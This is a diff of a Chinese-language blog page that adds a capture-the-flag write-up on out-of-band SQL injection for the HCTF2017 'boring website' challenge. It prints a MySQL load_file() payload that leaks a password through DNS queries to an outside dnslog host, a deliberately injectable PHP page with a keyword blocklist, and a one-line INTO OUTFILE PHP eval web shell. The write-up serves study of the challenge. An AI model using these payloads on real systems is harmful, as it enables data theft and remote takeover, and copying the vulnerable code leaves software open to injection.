@@ -5,17 +5,20 @@
   
   <title>OOB注入 | Err0r</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="信息安全">
+  <meta name="description" content="源于HCTF2017的一道题目，看来自己还是太年轻了，这种注入自己以前一直没见过，然后一搜一大把。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="OOB注入">
 <meta property="og:url" content="http://Err0rzz.github.io/2017/11/16/OOB注入/index.html">
 <meta property="og:site_name" content="Err0r">
-<meta property="og:description" content="信息安全">
+<meta property="og:description" content="源于HCTF2017的一道题目，看来自己还是太年轻了，这种注入自己以前一直没见过，然后一搜一大把。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-11-16T11:52:06.057Z">
+<meta property="og:image" content="https://i.imgur.com/Kt2bOVq.png">
+<meta property="og:image" content="https://i.imgur.com/Tro5zcn.jpg">
+<meta property="og:updated_time" content="2017-11-17T04:41:45.700Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="OOB注入">
-<meta name="twitter:description" content="信息安全">
+<meta name="twitter:description" content="源于HCTF2017的一道题目，看来自己还是太年轻了，这种注入自己以前一直没见过，然后一搜一大把。">
+<meta name="twitter:image" content="https://i.imgur.com/Kt2bOVq.png">
   
     <link rel="alternative" href="/atom.xml" title="Err0r" type="application/atom+xml">
   
@@ -197,7 +200,27 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        
+        <p>源于HCTF2017的一道题目，看来自己还是太年轻了，这种注入自己以前一直没见过，然后一搜一大把。</p>
+<a id="more"></a>
+<p>SQL注入类型细分，分为以下5种：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1. Boolean-based blind SQL injection </div><div class="line">2. Error-based SQL injection</div><div class="line">3. UNION query SQL injection</div><div class="line">4. Stacked queries SQL injection</div><div class="line">5. Time-based blind SQL injection</div></pre></td></tr></table></figure></p>
+<p>共计3大类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1. inband</div><div class="line">2. inference</div><div class="line">3. out of band(OOB)</div></pre></td></tr></table></figure></p>
+<p><strong>OOB</strong>与我们熟知的inband类的注入相反。inband是利用web应用来直接获取数据，比如Error-based SQL injection和UNION query SQL injection都是属于inband类，它们都是通过web的响应或者错误反馈来提取数据。</p>
+<p>而inference则是通过web的一些反映来推断数据，比如Boolean-based blind SQL injection和Stacked queries SQL injection 也就是我们通俗的盲注，通过web应用的其他改变来推断数据。</p>
+<p>我们的主角OOB则是通过其他传输方式来获得数据，比如利用我们等会要说到的DNS解析协议和电子邮件。当你遇到了某些很隐蔽的注入点，inband类注入没办法用，inference类注入被你嫌弃太慢的时候，OOB就是你最好的选择了。</p>
+<p>原理什么的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[http://bobao.360.cn/learning/detail/3458.html](http://bobao.360.cn/learning/detail/3458.html)</div><div class="line">[http://www.freebuf.com/vuls/138838.html](http://www.freebuf.com/vuls/138838.html)</div><div class="line">[http://www.jianshu.com/p/95c814c515a2](http://www.jianshu.com/p/95c814c515a2)</div></pre></td></tr></table></figure></p>
+<p>大致就是如果目标服务器是搭在win下，且有能操控文件的函数，且配置不当，如mysql中的<strong>secure_file_priv</strong>全局系统变量配置问题，就有可能会触发<strong>OOB注入</strong>。注入过程呢，是通过那些函数，例如load_file()去发送DNS请求，然后将我们的查询语句构造在DNS查询中，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">利用payload是：load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxx.ceye.io\abc&apos;))</div><div class="line">concat是字符串拼接</div><div class="line">database()就是你要做SQL注入查询的地方</div><div class="line">&apos;.xxxx.ceye.io\abc&apos;就是你的dnslog平台给你的域名</div><div class="line">后面的abc可以改也可以不改，无所谓的，你乐意写啥就写啥</div></pre></td></tr></table></figure></p>
+<p>这里的域名是在<a href="http://ceye.io/" target="_blank" rel="external">http://ceye.io/</a>中注册得到的。</p>
+<h1 id="boring-website"><a href="#boring-website" class="headerlink" title="boring website"></a>boring website</h1><p>这是HCTF2017的一道题目。<br>题目：<a href="https://github.com/hammerorz/HCTF2017-easy-sign-and-boring-website" target="_blank" rel="external">https://github.com/hammerorz/HCTF2017-easy-sign-and-boring-website</a><br>wp：<a href="https://xianzhi.aliyun.com/forum/topic/1589/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/1589/</a></p>
+<p>知道了这个注入之后就很好做了，直接抄wp了</p>
+<p>发现应该是<code>sql server</code>用<code>linkserver</code>来连接<code>mysql</code>。所以去查了一波<code>linkserver</code>的用法，以及结合注释可得<code>select * from openquery(mysql,&#39;select xxx&#39;)</code>可以从<code>mysql</code>数据库中查得信息，但是没有回显，<code>sleep</code>函数也被ban了，然后看到oob的提示，去查了一波<code>mysql out-of-band</code>，发现<code>load_file</code>函数可以通过dns通道把所查得的数据带出来。接下来的过程就是十分常见简单的mysql注入的流程。</p>
+<p>这里值得另外一提的是，本来不知道原来还能用<code>openquery</code>来进行连接不同的服务器，又学到了。</p>
+<p>我将题目重新搭了一下，不过因为本地没有安装sql server，所以就没有搭sql servser环境，只是复现了<code>load_file</code>的<code>dns</code>查询。而一开始没有成功，发现是少了配置条件，没有配置<strong>secure-file-priv</strong>。截图如下：</p>
+<p><strong>本地数据库信息</strong><br><img src="https://i.imgur.com/Kt2bOVq.png" alt=""></p>
+<p><strong>重新搭的题目源码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$conn=@mysql_connect(&quot;localhost&quot;,&apos;root&apos;,&apos;root&apos;) or die(&quot;数据库连接失败！&quot;);;</div><div class="line"></div><div class="line">#echo &quot;Connected to MySQL&lt;br /&gt;&quot;;</div><div class="line">echo &quot;Connected to MYSQL&lt;br /&gt;&quot;;</div><div class="line"></div><div class="line">mysql_select_db(&quot;sql4&quot;,$conn) or die(&quot;您要选择的数据库不存在&quot;);</div><div class="line">if(isset($_GET[&apos;id&apos;]))&#123;</div><div class="line">$id = $_GET[&apos;id&apos;];</div><div class="line">if(preg_match(&apos;/EXEC|xp_cmdshell|sp_configure|xp_reg(.*)|CREATE|DROP|declare</div><div class="line">|if|insert|into|outfile|dumpfile|sleep|wait|benchmark/i&apos;, $id)) &#123;</div><div class="line">die(&apos;stupid hacker&apos;);</div><div class="line">&#125;</div><div class="line">$query = &quot;select username from not_here where id = $id&quot;; </div><div class="line">$stmt = mysql_query( $query );</div><div class="line">$arr=@mysql_fetch_array($query);</div><div class="line"></div><div class="line">if (is_array($arr))&#123;</div><div class="line">//TO DO: ...</div><div class="line">//It&apos;s time to sleep...</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">else print(&quot;?id&quot;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p><strong>payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=8 union select load_file(concat(&quot;\\\\&quot;,(select password from secret),&quot;.3g3dxq.ceye.io\\abc&quot;))</div></pre></td></tr></table></figure></p>
+<p><strong>结果</strong><br><img src="https://i.imgur.com/Tro5zcn.jpg" alt=""></p>
+<p><strong>PS:</strong><br>在搜索这些函数的时候，学会一个新姿势,算是意外之喜吧。用mysql写一句话:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select &apos;&lt;?php eval($_POST[cmd])?&gt;&apos; into outfile &apos;D:/PHPnow-1.5.4/htdocs/index2.php&apos;</div></pre></td></tr></table></figure></p>
+
       
       
         <div class="page-reward">
@@ -255,7 +278,7 @@
         <p><span>本文标题:</span><a href="/2017/11/16/OOB注入/">OOB注入</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Err0r 的个人博客">Err0r</a></p>
         <p><span>发布时间:</span>2017年11月16日 - 19时52分</p>
-        <p><span>最后更新:</span>2017年11月16日 - 19时52分</p>
+        <p><span>最后更新:</span>2017年11月17日 - 12时41分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2017/11/16/OOB注入/" title="OOB注入">http://Err0rzz.github.io/2017/11/16/OOB注入/</a>
             <span class="copy-path" data-clipboard-text="原文: http://Err0rzz.github.io/2017/11/16/OOB注入/　　作者: Err0r" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -284,7 +307,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#boring-website"><span class="toc-number">1.</span> <span class="toc-text">boring website</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
